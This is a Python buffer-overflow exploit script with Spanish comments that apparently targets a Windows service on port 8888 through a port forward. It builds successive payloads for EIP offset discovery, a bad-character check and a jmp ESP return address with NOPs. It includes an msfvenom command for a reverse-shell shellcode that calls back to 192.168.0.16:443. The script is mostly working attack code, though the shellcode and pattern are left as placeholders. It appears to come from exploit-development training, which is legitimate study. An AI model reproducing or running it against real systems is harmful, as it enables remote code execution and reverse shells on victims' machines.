``` python


#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
# Dirección local porque se hace un Remote Port Forwarding
remoteAddress = "127.0.0.1" 	

def executeExploit():
	
	# Comprobar el buffer overflow
	payload1 = b"A"*5000		# En formato bytes
	
	# Comprobar bof con un payload creado especialmente para comprobar el offset del EIP
	# /usr/share/metasploit-framework/exploit/pattern_create.rb -l 5000
	
	payload2 = "<payload_creado_por_pattern_create.rb>"
	
	# Variables para controlar el EIP
	# /usr/share/metasploit-framework/exploit/pattern_offset.rb -q <valor_EIP>
	
	offset = "<offset_obtenido_por_pattern_offset.rb>" 	# En este caso offset = 1052
	before_eip = b"A"*offset
	EIP = b"B"*4
	after_eip = b"C"*500
	
	payload3 = before_eip + EIP + after_eip
	
	# Descubrimiento de badchars, caracteres que no interpreta el programa	
	badchars = (b"\x01\.......\xff")	# En formato bytes
	
	payload4 = before_eip + EIP + badchars
	
	# Creación de shellcode para obtener una shell reversa	
	# msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows 
	# LHOST=192.168.0.16 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c
	shellcode = (b"<shellcode obtenido con msfvenom>")
	
	payload5 = before_eip + EIP + shellcode
	
	# EIP apuntando a dirección donde se encuentra OPCODE jmp ESP, obtenido desde Inmunity Debugger
	# Introducción de NOPS (NO Operation Codes) para dar tiempo a la muestra a desencriptarse
	EIP2 = pack("<I", 0x68a98a7b)
	NOPS = b"\x90"*16
	
	payload6 = before_eip + EIP2 + NOPS + shellcode	
	
	# Cambio de NOPS por instrucción de desplazamiento de pila (sub esp,0x10 --> 83 ec 10)
	payload7 = before_eip + EIP2 + b"\x83\xec\x10" + shellcode
	
	#Ejecución del socket para enviar el payload	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteAddress, 8888))
	s.send(payload7)
	
	

if __name__ == '__main__':

	executeExploit()

```